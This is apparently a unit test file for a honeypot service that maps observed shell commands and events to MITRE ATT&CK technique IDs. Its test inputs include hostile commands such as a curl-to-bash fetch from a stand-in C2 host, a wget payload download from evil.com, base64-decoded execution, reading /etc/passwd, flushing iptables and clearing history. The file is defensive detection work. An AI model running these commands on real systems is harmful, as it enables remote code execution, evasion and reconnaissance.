"""Unit tests for the MITRE ATT&CK mapping — section 1.10."""

from __future__ import annotations

from app.services.enrichment.mitre import (
    classify_command,
    classify_event,
    get_technique_info,
)


class TestCommandClassification:
    """Tests for shell command → MITRE technique mapping."""

    def test_wget_download(self):
        mitre_id, technique = classify_command("wget http://evil.com/payload.sh")
        assert mitre_id == "T1105"

    def test_curl_download(self):
        mitre_id, technique = classify_command("curl http://c2.example.com/bot | bash")
        assert mitre_id == "T1105"

    def test_uname_discovery(self):
        mitre_id, technique = classify_command("uname -a")
        assert mitre_id == "T1082"

    def test_cat_passwd(self):
        mitre_id, technique = classify_command("cat /etc/passwd")
        assert mitre_id == "T1082"

    def test_ps_process_discovery(self):
        mitre_id, technique = classify_command("ps aux")
        assert mitre_id == "T1057"

    def test_crontab_persistence(self):
        mitre_id, technique = classify_command("crontab -e")
        assert mitre_id == "T1053.003"

    def test_history_clear(self):
        mitre_id, technique = classify_command("history -c")
        assert mitre_id == "T1070"

    def test_iptables_defense_evasion(self):
        mitre_id, technique = classify_command("iptables -F")
        assert mitre_id == "T1562"

    def test_base64_obfuscation(self):
        mitre_id, technique = classify_command("echo payload | base64 -d | bash")
        assert mitre_id == "T1027"

    def test_ls_file_discovery(self):
        mitre_id, technique = classify_command("ls -la /tmp")
        assert mitre_id == "T1083"

    def test_unknown_command(self):
        mitre_id, technique = classify_command("some_custom_binary --arg")
        assert mitre_id is None
        assert technique is None


class TestEventClassification:
    """Tests for event-level MITRE technique mapping."""

    def test_ssh_login_attempt(self):
        mitre_id, name = classify_event("login_attempt", "cowrie")
        assert mitre_id == "T1110"

    def test_wp_login_attempt(self):
        mitre_id, name = classify_event("login_attempt", "wp-decoy")
        assert mitre_id == "T1110"

    def test_rdp_login(self):
        mitre_id, name = classify_event("login_attempt", "rdp-decoy")
        assert mitre_id == "T1110"

    def test_dionaea_exploit(self):
        mitre_id, name = classify_event("exploit_probe", "dionaea")
        assert mitre_id == "T1190"

    def test_port_scan(self):
        mitre_id, name = classify_event("port_scan", "dionaea")
        assert mitre_id == "T1046"

    def test_command_exec_with_payload(self):
        mitre_id, name = classify_event("command_exec", "cowrie", payload="wget http://evil.com/bot.sh")
        assert mitre_id == "T1105"  # Should classify the command, not the generic event type

    def test_command_exec_without_payload(self):
        mitre_id, name = classify_event("command_exec", "cowrie")
        assert mitre_id == "T1059"


class TestTechniqueInfo:
    """Tests for technique info lookup."""

    def test_known_technique(self):
        info = get_technique_info("T1110")
        assert info is not None
        assert info.name == "Brute Force"
        assert info.tactic == "Credential Access"

    def test_sub_technique(self):
        info = get_technique_info("T1059.004")
        assert info is not None
        assert info.name == "Unix Shell"

    def test_unknown_technique(self):
        info = get_technique_info("T9999")
        assert info is None
